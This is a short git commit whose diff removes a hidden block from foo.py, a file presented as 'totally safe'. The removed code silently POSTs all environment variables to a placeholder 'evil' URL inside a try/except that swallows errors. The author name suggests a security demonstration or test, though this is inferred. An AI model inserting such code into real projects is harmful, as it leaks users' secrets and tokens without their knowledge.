a50cf2f696bcd286a88c3f1f8b9db1d37310c791
alessio-hackerone <149904081+alessio-hackerone@users.noreply.github.com>
2023-11-04 21:47:19 +0100

    Update foo.py

--- foo.py
+++ foo.py
@@ -2,12 +2,4 @@ print("a totally safe file")
 
 print("all good")
 
-# A totally unsafe change!
-try:
-    from urllib.request import urlopen
-    from urllib.parse import urlencode
-    import os
-    evil_url = "http://localhost:8080/post"  # replace with your preferred evil website
-    urlopen(evil_url, data=urlencode(os.environ).encode('utf-8'))
-except:
-    pass
+print("a safe change")
